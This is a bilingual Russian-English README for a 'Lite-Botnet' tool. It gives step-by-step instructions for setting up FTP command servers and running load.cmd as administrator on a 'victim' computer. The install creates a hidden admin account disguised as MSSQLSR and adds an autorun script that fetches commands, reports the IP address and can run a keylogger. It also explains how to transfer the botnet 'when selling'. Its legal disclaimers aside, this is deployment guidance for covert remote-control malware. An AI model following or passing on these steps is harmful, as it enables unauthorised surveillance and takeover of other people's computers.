Lite-Botnet
=========

A variant of scripts for organizing a lightweight botnet on remote computers is presented to your attention. This botnet can be used not only for criminal purposes, but also, for example, for remote monitoring of children's computers, for remote control of computers to which it is impossible to provide remote access to the organization, etc. The author removed all the «military» part from this program, and also removed third-party software, based on these requirements. However, the author left the scripts as an example of using this botnet to open access to this computer using RTM or TELNET protocols.

Attention! The use of this software without informing the user that «his actions are being recorded» is a criminal offense under Russian and international laws and is punished with up to 5 years of imprisonment! The use of this botnet for personal purposes is permitted by Russian laws, if the information obtained with its help is not under any circumstances for third parties and will not be published to the public.

The most complete instruction for the program is in Russian language. If you do not speak Russian, use an online translator, for example, from Google.

Данному вниманию представлен вариант скриптов для организации облегчённого ботнета на удалённых компьютерах. Данный ботнет может использоваться не только в криминальных целях, но и, например, для удалённого наблюдения за компьютерами детей, удалённого управления компьютерами в организации, к которым невозможно предоставить удалённый доступ и т.п. Исходя из данных требований, автор убрал из данного ботнета всю «боевую» криминальную часть, а также стороннее программное обеспечение. Однако, в качестве примера использования данного ботнета, автор оставил скрипты, открывающие доступ к данному компьютеру по протоколам RTM или TELNET.

Внимание! По Российским и международным законам использование данного программного обеспечения без информирования пользователя о том, что «его действия записываются», является уголовным преступлением с наказанием до 5 лет лишения свободы! В личных целях использование ботнета допускается Российскими законами, только если полученная с его помощью информация ни при каких обстоятельствах не попадёт третьим лицам и не будет выложена в публичный доступ.

## Принцип работы программы


После инсталляции файлов ботнета в системном окружении операционной системы появляются следующие переменные:

Hacker_User – имя (логин) учётной записи компьютера-жертвы на ftp серверах хозяина, с которых будет осуществляться управление ботнетом
Hacker_Pass – пароль для этой учётной записи. Его нужно указывать, чтобы посторонние не имели доступа к данным жертвы на сервере хозяина. Внимание! Пароль храниться в незащищённом виде! Просто автор не нашёл способа безопасного использования хеша и солей в программах коммуникации.
Hacker_host1 – доменное имя публичного хоста, с которого скачивается установочные файлы и публичные обновления ботнета. Её значение может совпадать со значением следующей переменной, когда используется только один хост.
Hacker_host2 – доменное имя приватного хоста, с которого скачиваются в оффлайн-режиме команды управления ботнетом и на который передаются результаты его работы

Также создаётся учётная запись с именем MSSQLSR для возможного удалённого подключения к компьютеру, а в автозагрузку для всех пользователей добавляется файл onsysload, в котором находятся текущие команды управления ботнетом.

На приватном хосте создаются аккаунты пользователя-жертвы FTP сервера. В корень этого сервера будут «сваливаться» результаты работы компьютера-жертвы в ботнете, а в папке Private будут расположены командные файлы, загружаемые на компьютер-жертву для управления им.

Рабочая директория ботнета для компьютера-жертвы – c:\pub1\Util

При входе в аккаунт компьютера любого пользователя запускается на обработку файл onsysload. В нём присутствуют следующие обязательные части:

* ftp загрузка команд для исполнения команд на компьютере-жертве (например, новый файл onsysload или новый файл отправки данных)
* Определение внешнего IP адреса компьютера в Интернете;
* Переименование и отправка файла с IP адресом на сервер хозяина

Остальные команды ботнета не являются обязательными, но реализуют его функциональную часть (системное администрирование, запуск кейлоггера, передача файлов видеонаблюдения и т.п.)

## Дополнительное программное обеспечение


Для своей работы ботнет требует дополнительно следующее программное обеспечение:

* Установленный в систему ftp клиент. Без него невозможна инсталляция и получение данных. Как правило, консольный ftp клиент установлен во всех операционных системах по-умолчанию.
* Клиент curl и wget для отправки и получения данных с ftp серверов. В Microsoft Windows эти клиенты не устанавливаются по умолчанию, и их нужно будет добавить в папку c:\pub1\Util на компьютер-жертву самостоятельно.


### Версия

0.2.alpha

Была написана английская документация

0.1.alpha

Созданы основные модули и документация к ним

## Установка программы


### I. Установка программы на FTP сервер
----

1. Скачивается архив с файлами на клиентский компьютер;
2. Поднимается FTP сервер с анонимным пользователем (доступ только для чтения, без пароля). его полное доменное имя запоминается и потом заносится в переменную "Hacker host server 1 domain";
3. В корень этого хоста закачиваются все файлы и каталоги из каталога "Windows" архива (там должна содержаться только папка pub1);
4. Поднимается второй FTP сервер (он может быть тем же, что и первый), в котором создаётся учётная запись. Её логин записывается потом в переменную "username", а пароль — в переменную "password". Доменное имя этого хоста потом запишется в переменную "Hacker_host server 2domain";
5. В объявляем эту учётную запись доступной для чтения и записи, а также для создания в ней каталогов;
6. В корне каталога этой учётной записи создаём папку private, и оставляем её пустой;
7. Переходим к установке программ на компьютере клиентов;


### II. Установка программы с сервера на компьютеры клиентов
----
1. Из каталога на сервере github проекта: "Windows/pub1/Util" скачивается файл "load.cmd" на клиентский компьютер;
2. Этот файл запускается в операционной системе с правами локального администратора по этой схеме:

> rem Файл загрузки и установки ботнета (Академический вариант)
> 
> rem USAGE
> 
> rem > load.cmd <user name> <pass word> <hacker host server 1 domain> <hacker host server 2 domain>
> 
> rem Запускать файл с правами администратора


где <> означают значения соответствующих переменных, запомненных в части I.

3. Устанавливаем в папку C:\pub1\Util дополнительное программное обеспечение;
4. Перезагружаем клиентский компьютер;

На Вашем FTP сервере 2, в корне каталога именной учётной записи появятся файлы MySystemInfoCheck.txt и MyIP-*.txt, где звёздочка обозначает текущую дату и время.

## Удаление программы с клиентских компьютеров Windows

Удаление программ происходит в следующей последовательности:
1. Удаляется из ветви реестра HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run параметр «Onload Command Interface» со значением «c:\pub1\Util\onsysload.cmd»;
2. Удаляются системные переменные Hacker_User, Hacker_Pass, Hacker_host1 и Hacker_host2 вместе с их значениями;
3. Удаляются возможные задачи, добавленные в системный планировщик задач вручную (автоматически они туда пока не прописываются);
4. Удаляется каталог c:\pub1 с диска;

## Смена владельца ботнета (при продаже)


Необходимо просто изменить значения переменных Hacker_Pass, Hacker_User, Hacker_host1, Hacker_host2 и сменить пароль учётной записи MSSQLSR.

## Лицензия

Система бесплатная для некоммерческого использования. Для использования в коммерческих целях напишите на [Email], иначе возможны проблемы с лицензионными отчислениями для дополнительных программного обеспечения, упомянутого тут.

## Разработка


Разработка Юрия Денисова (yudenisov) @ New Internet Technology [Personal Site 1] | [Twitter 1] | [Facebook] | [Blog 1] | [Blog 2] | [Blog 3]

## Additional software


For its work the botnet requires additionally the following software:

* Installed the ftp client in the system. You can not install and retrieve data without it. Typically, console ftp client is installed by default on all operating systems.
* The client curl and wget to send and receive data from ftp servers. These clients are not installed by default in Microsoft Windows, and they will need to be added to the c:\pub1\Util folder on the victim computer.


### Version

0.2.alpha

It was written English documentation

0.1.alpha

Created main modules and the documentation

## Installation


### I. Installing the program on an FTP server
----
1. Download the archive with the files on the client computer;
2. Set up an FTP server with an anonymous user (read-only access, no password). Its full domain name is stored and later entered into the variable "Hacker host server 1 domain";
3. All files and directories from the "Windows" directory of the archive are downloaded to the root of this host (there should only contain the folder pub1);
4. The second FTP server is configured (it can be the same as the first one), in which the account is created. Its login is then written to the "user name" variable, and its password is written to the "pass word" variable. The domain name of this host will then be written to the variable "Hacker host server 2 domain";
5. We declare this account to be readable and writable, and also to create directories in it;
6. Create a private folder in the root directory of this account, and leave it empty;
7. We proceed to install the programs on the client's computer;


### II. Installing the program from the server to client computers
----

1. The file "load.cmd" is downloaded to the client computer from the "Windows / pub1 / Util" directory on the github server of this project;
2. This file is launched in the operating system with local administrator rights according to this scheme:

> rem The boot file and the botnet settings (Academic version)
> 
> rem USAGE
> 
> rem > load.cmd <user name> <pass word> <hacker host server 1 domain> <hacker host server 2 domain>
> 
> rem Run the file with administrator rights


where <> means the values of the corresponding variables stored in part I.

3. Install additional software into the folder C:\pub1\Util;
4. Restart the client computer;

Files MySystemInfoCheck.txt and MyIP - *. Txt, where the asterisk denotes the current date and time, appear on your FTP server # 2, at the root of the registered user account.

## Uninstalling the program from Windows client 

The programs uninstallation takes place in the following sequence:
1. The parameter «Onload Command Interface» with the value «c:\pub1\Util\onsysload.cmd» is removed from the registry keys «HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run»;
2. The system variables «Hacker_User», «Hacker_Pass», «Hacker_host1» and «Hacker_host2» are removed along with their values;
3. Possible tasks added to the system task scheduler are manually deleted (they are not automatically registered there yet);
4. The directory c:\pub1 is deleted from the disk;

## Change the owner of the botnet (when selling)


The values of the variables Hacker_Pass, Hacker_User, Hacker_host1, Hacker_host2, you just need to change and change the password of the MSSQLSR account.

### License


The system is free for non-commercial use. For a commercial purpose, write to [Email], because it is probable the problems with a license fee for auxiliaries programs, mention it.

## Development


Develop by Yuri Denisov @ New Internet Technology [Personal Site 1] | [Twitter 1] | [Facebook] | [Blog 1] | [Blog 2] | [Blog 3]


[Personal Site 1]:http://yudenis.ucoz.ru/
[Twitter 1]:http://twitter.com/yudenisov
[Facebook]:https://www.facebook.com/yudenisov
[Blog 1]:http://yudenisov.livejournal.com/
[Blog 2]:https://yudenisov.wordpress.com/
[Blog 3]:http://agentstvo.yudenisov.ru/
[Email]:mailto:yudenisov@mail.ru
